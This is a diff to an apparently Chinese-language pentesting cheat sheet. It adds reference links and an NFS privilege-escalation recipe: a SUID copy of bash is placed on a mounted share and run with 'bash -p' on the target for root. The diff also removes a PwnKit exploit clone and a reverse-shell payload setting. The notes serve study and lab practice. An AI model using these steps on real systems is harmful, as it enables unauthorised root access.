@@ -4,6 +4,8 @@
 * [Red Team Notes - Pentesting Cheatsheets](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
 * [HAUSEC - Pentesting Cheatsheet](https://hausec.com/pentesting-cheatsheet/)
 * [資安職能筆記 - 系統及網站滲透測試](https://hackmd.io/@nfu-johnny/H1lpm_ira)
+* [Linux Commands](https://www.computerhope.com/unix.htm)
+* [Vulnhub 練習](https://hackmd.io/@k1tten/By_3_x7SE)
 
 ## _nmap_
 
@@ -240,7 +242,7 @@ snow -C -p pass -m "message" text1.txt text2.txt
 snow -C -p pass text2.txt text3.txt
 ```
 
-## _mount_
+## _Mount NFS & NFS提權_
 
 ```sh
 # to scan the target IP address for an open NFS port (port 2049) 
@@ -249,9 +251,13 @@ rpcinfo -p <Target IP Address>
 apt install nfs-common
 service rpcbind start
 showmount -e 10.10.10.20
-mount -t nfs 10.10.10.20:/home /mnt/nfs
+sudo mount -t nfs 10.10.10.20:/home /mnt/nfs
+sudo cp /bin/bash /mnt/nfs/
+sudo chmod +s /mnt/nfs/bash
+ssh -l user target_ip
+/xxx/bash -p
 # to mount an SMB share on a Linux system
-mount -t cifs //10.10.10.20/C$ /mnt/smb -o username=king,password=slave
+sudo mount -t cifs //10.10.10.20/C$ /mnt/smb -o username=king,password=slave
 ```
 
 ## _smbclient_
@@ -342,14 +348,7 @@ VeraCrypt
 CrypTool
 ophcrack
 visudo
-git clone https://github.com/ly4k/PwnKit.git    //CVE-2021-4034
 https://github.com/horsicq/DIE-engine/releases  //DIE
-nikto -h http://url -Tuning x -o results -F txt
-https://highon.coffee/blog/nikto-cheat-sheet/
-https://crackstation.net/
-https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
-service rpcbind start
-set PAYLOAD php/reverse_php
 ```
 
 ## License
